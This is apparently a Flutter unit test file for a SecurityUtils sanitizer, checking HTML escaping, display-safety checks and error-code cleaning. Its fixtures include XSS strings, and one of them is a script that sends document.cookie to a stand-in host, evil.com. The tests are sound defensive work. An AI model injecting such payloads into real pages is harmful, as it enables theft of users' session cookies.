import 'package:flutter_test/flutter_test.dart';
import 'package:integrity_studio_ai/utils/security_utils.dart';

void main() {
  group('SecurityUtils', () {
    group('sanitizeUserInput', () {
      test('returns empty string for null input', () {
        expect(SecurityUtils.sanitizeUserInput(null), equals(''));
      });

      test('returns empty string for empty input', () {
        expect(SecurityUtils.sanitizeUserInput(''), equals(''));
      });

      test('escapes HTML script tags', () {
        const input = '<script>alert("xss")</script>';
        final result = SecurityUtils.sanitizeUserInput(input);

        expect(result, contains('&lt;script&gt;'));
        expect(result, contains('&lt;&#x2F;script&gt;'));
        expect(result, isNot(contains('<script>')));
      });

      test('escapes img tag with onerror XSS', () {
        const input = '<img src=x onerror="alert(1)">';
        final result = SecurityUtils.sanitizeUserInput(input);

        expect(result, contains('&lt;img'));
        expect(result, contains('&gt;'));
        expect(result, isNot(contains('<img')));
      });

      test('escapes all HTML special characters', () {
        const input = '& < > " \' /';
        final result = SecurityUtils.sanitizeUserInput(input);

        expect(result, contains('&amp;'));
        expect(result, contains('&lt;'));
        expect(result, contains('&gt;'));
        expect(result, contains('&quot;'));
        expect(result, contains('&#x27;'));
        expect(result, contains('&#x2F;'));
      });

      test('preserves safe text content', () {
        const input = 'Hello World! This is safe text.';
        final result = SecurityUtils.sanitizeUserInput(input);

        expect(result, equals('Hello World! This is safe text.'));
      });

      test('truncates to default maxErrorLength', () {
        final input = 'A' * 300;
        final result = SecurityUtils.sanitizeUserInput(input);

        expect(result.length, equals(203)); // 200 + '...'
        expect(result, endsWith('...'));
      });

      test('truncates to custom maxLength', () {
        final input = 'A' * 100;
        final result = SecurityUtils.sanitizeUserInput(input, maxLength: 50);

        expect(result.length, equals(53)); // 50 + '...'
        expect(result, endsWith('...'));
      });

      test('does not truncate if under limit', () {
        const input = 'Short message';
        final result = SecurityUtils.sanitizeUserInput(input);

        expect(result, equals('Short message'));
        expect(result, isNot(endsWith('...')));
      });

      test('handles complex XSS payload', () {
        const input = '''<script>fetch("https://evil.com?c="+document.cookie)</script>''';
        final result = SecurityUtils.sanitizeUserInput(input);

        expect(result, isNot(contains('<script>')));
        expect(result, isNot(contains('</script>')));
        expect(result, contains('&lt;script&gt;'));
      });

      test('handles nested HTML tags', () {
        const input = '<div><p onclick="evil()">Click me</p></div>';
        final result = SecurityUtils.sanitizeUserInput(input);

        expect(result, isNot(contains('<div>')));
        expect(result, isNot(contains('<p')));
        expect(result, contains('&lt;div&gt;'));
      });
    });

    group('isSafeForDisplay', () {
      test('returns true for null input', () {
        expect(SecurityUtils.isSafeForDisplay(null), isTrue);
      });

      test('returns true for empty input', () {
        expect(SecurityUtils.isSafeForDisplay(''), isTrue);
      });

      test('returns true for safe alphanumeric text', () {
        expect(SecurityUtils.isSafeForDisplay('Hello World 123'), isTrue);
      });

      test('returns false for text with angle brackets', () {
        expect(SecurityUtils.isSafeForDisplay('<script>'), isFalse);
        expect(SecurityUtils.isSafeForDisplay('text>more'), isFalse);
      });

      test('returns false for text with quotes', () {
        expect(SecurityUtils.isSafeForDisplay('say "hello"'), isFalse);
        expect(SecurityUtils.isSafeForDisplay("it's"), isFalse);
      });

      test('returns false for text with forward slash', () {
        expect(SecurityUtils.isSafeForDisplay('path/to/file'), isFalse);
      });
    });

    group('sanitizeErrorCode', () {
      test('returns null for null input', () {
        expect(SecurityUtils.sanitizeErrorCode(null), isNull);
      });

      test('returns null for empty input', () {
        expect(SecurityUtils.sanitizeErrorCode(''), isNull);
      });

      test('allows valid error codes with underscores', () {
        expect(SecurityUtils.sanitizeErrorCode('access_denied'), equals('access_denied'));
        expect(SecurityUtils.sanitizeErrorCode('INVALID_TOKEN'), equals('INVALID_TOKEN'));
      });

      test('allows valid error codes with hyphens', () {
        expect(SecurityUtils.sanitizeErrorCode('access-denied'), equals('access-denied'));
      });

      test('allows alphanumeric error codes', () {
        expect(SecurityUtils.sanitizeErrorCode('error123'), equals('error123'));
        expect(SecurityUtils.sanitizeErrorCode('E404'), equals('E404'));
      });

      test('sanitizes error codes with special characters', () {
        final result = SecurityUtils.sanitizeErrorCode('<script>');
        expect(result, contains('&lt;'));
        expect(result, isNot(contains('<')));
      });

      test('truncates long error codes', () {
        final longCode = 'error_' * 20;
        final result = SecurityUtils.sanitizeErrorCode(longCode);

        expect(result!.length, lessThanOrEqualTo(103)); // 100 + '...'
      });
    });

    group('constants', () {
      test('maxErrorLength is reasonable', () {
        expect(SecurityUtils.maxErrorLength, equals(200));
      });

      test('maxErrorCodeLength is reasonable', () {
        expect(SecurityUtils.maxErrorCodeLength, equals(100));
      });
    });
  });
}
